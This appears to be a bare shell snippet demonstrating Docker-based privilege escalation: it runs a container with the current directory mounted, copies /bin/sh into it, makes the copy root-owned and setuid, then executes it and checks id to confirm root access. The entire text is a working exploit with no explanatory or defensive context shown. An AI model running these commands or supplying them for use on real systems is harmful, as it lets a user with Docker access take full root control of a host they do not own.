```
id
docker build -t overlord .
docker run -v $PWD:/swarm -t overlord /bin/sh -c 'cp /bin/sh /swarm && chown root.root /swarm/sh && chmod a+s /swarm/sh'
./sh
id
```

